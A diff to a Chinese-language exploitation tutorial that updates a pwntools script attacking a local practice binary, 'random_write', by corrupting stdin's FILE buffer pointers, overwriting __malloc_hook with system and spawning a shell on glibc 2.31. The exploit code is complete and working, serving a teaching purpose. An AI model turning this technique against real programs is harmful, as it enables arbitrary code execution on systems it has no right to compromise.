@@ -603,12 +603,17 @@ int main() {
 利用代码如下：
 
 ```py
+# verified on: glibc 2.31
+# not working on glibc 2.34+ due to dropped __malloc_hook
+
 from pwn import *
 
 context(os="linux", arch="amd64", log_level="debug", terminal=["tmux", "splitw", "-h"])
+e = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 p = process("./random_write")
 
 # read libc base address from the program
+p.recvuntil(b"libc base is at")
 line = p.recvline().decode("utf-8")
 libc_base = int(line.split(" ")[-1], 16)
 
@@ -616,7 +621,7 @@ libc_base = int(line.split(" ")[-1], 16)
 # step 1(["2"]): override _IO_buf_base to point to itself
 # step 2(["2"]): override _IO_buf_base to point to __malloc_hook and _IO_buf_end to __malloc_hook+8
 # step 3(["1"]*16): increment _IO_read_ptr until it equals to _IO_read_end
-# step 4(["2"]): trigger sys_read to write one_gadget to __malloc_hook variable
+# step 4(["2"]): trigger sys_read to write system to __malloc_hook variable
 p.recvuntil(b"input number of action")
 actions = ["2"] + ["2"] + ["1"] * 16 + ["2"]
 p.sendline(f"{len(actions)}".encode("utf-8"))
@@ -624,9 +629,10 @@ p.recvuntil(b"input actions")
 p.sendline(" ".join(actions).encode("utf-8"))
 
 # send address of "/bin/sh" as malloc size
-# obtained by decompiling system()
 p.recvuntil(b"input malloc size")
-bin_sh = libc_base + 0x1B45BD
+# obtained by decompiling system()
+# bin_sh = libc_base + 0x1B45BD
+bin_sh = libc_base + next(e.search(b"/bin/sh"))
 p.sendline(f"{bin_sh}".encode("utf-8"))
 
 # initially _IO_buf_base points to stdin._shortbuf,
@@ -634,7 +640,8 @@ p.sendline(f"{bin_sh}".encode("utf-8"))
 # override the lowest two bytes of stdin._IO_buf_base to 0xC9B8
 # then _IO_buf_base points to libc_base + 0x1EC9B8, which is _IO_buf_base itself
 # obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep __IO_2_1_stdin
-stdin = libc_base + 0x1EC980
+# stdin = libc_base + 0x1EC980
+stdin = libc_base + e.symbols["_IO_2_1_stdin_"]
 stdin_io_buf_base = stdin + 0x38  # offsetof(struct _IO_FILE, _IO_buf_base)
 p.recvuntil(b"input address and data")
 p.sendline(f"0x{stdin_io_buf_base:x} {stdin_io_buf_base & 0xFFFF}".encode("utf-8"))
@@ -644,7 +651,8 @@ p.sendline(f"0x{stdin_io_buf_base:x} {stdin_io_buf_base & 0xFFFF}".encode("utf-8
 # __malloc_hook+8 to _IO_buf_end.
 # this is required _IO_buf_base must be smaller than _IO_buf_end.
 # obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep malloc_hook
-malloc_hook = libc_base + 0x1ECB70
+# malloc_hook = libc_base + 0x1ECB70
+malloc_hook = libc_base + e.symbols["__malloc_hook"]
 p.recvuntil(b"input address and data")
 p.send(p64(malloc_hook) + p64(malloc_hook + 8))
 
@@ -653,15 +661,21 @@ p.send(p64(malloc_hook) + p64(malloc_hook + 8))
 # we want them to become equal to read more data into _IO_buf_base,
 # the _IO_read_ptr pointer is incremented 16 times via getchar().
 
+# if you want to debug:
+# gdb.attach(p)
+# pause()
+
 # override __malloc_hook to system
 # obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system
-system = libc_base + 0x52290
+# system = libc_base + 0x52290
+system = libc_base + e.symbols["system"]
 p.recvuntil(b"input address and data")
 p.sendline(p64(system))
 
 # waiting for shell
 p.sendline(b"whoami && id")
 p.interactive()
+p.recvall(timeout=1)
 ```
 
 ### 控制流劫持
